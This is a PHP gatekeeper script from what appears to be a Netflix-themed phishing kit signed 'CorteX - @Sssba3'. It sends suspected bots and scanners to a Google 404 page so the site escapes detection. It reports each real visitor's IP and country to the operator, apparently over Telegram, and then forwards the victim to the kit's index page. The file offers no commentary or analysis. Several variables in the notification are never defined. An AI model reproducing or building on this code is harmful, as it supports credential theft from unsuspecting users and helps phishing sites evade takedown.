<?php
session_start();
include "config.php";
include "functions.php";


$user_ip = getClientIP();
$user_os = getOS();
$user_country_code = getCountryCode();
$timestamp = getCurrentTimestamp();


if (isset($_SESSION['allow']) && $_SESSION['allow'] == "yes") {
    header('Location: index.php');
    exit();
}


if (isBot()) {

    error_log("Bot detected: IP " . $user_ip . ", User-Agent: " . $_SERVER['HTTP_USER_AGENT']);
    header('Location: https://google.com/404'); 
    exit();
}


$_SESSION['allow'] = "yes";


$telegram_message = "
+ 1 NEW CLICK DE $country

🧩 Extra
├ 🖥️ PAYS : $country
└ 🌐 IP : $ip 

📍 Base : NETFLIX [$visit_time]
└ [© 2025 - All rights reserved.]

[🎰] CorteX - @Sssba3 [🎰]
";

if (sendMessage($telegram_message)) {
    error_log("Initial visit notification sent to Telegram successfully.");
} else {
    error_log("Failed to send initial visit notification to Telegram.");
}

header('Location: index.php');
exit();
?>
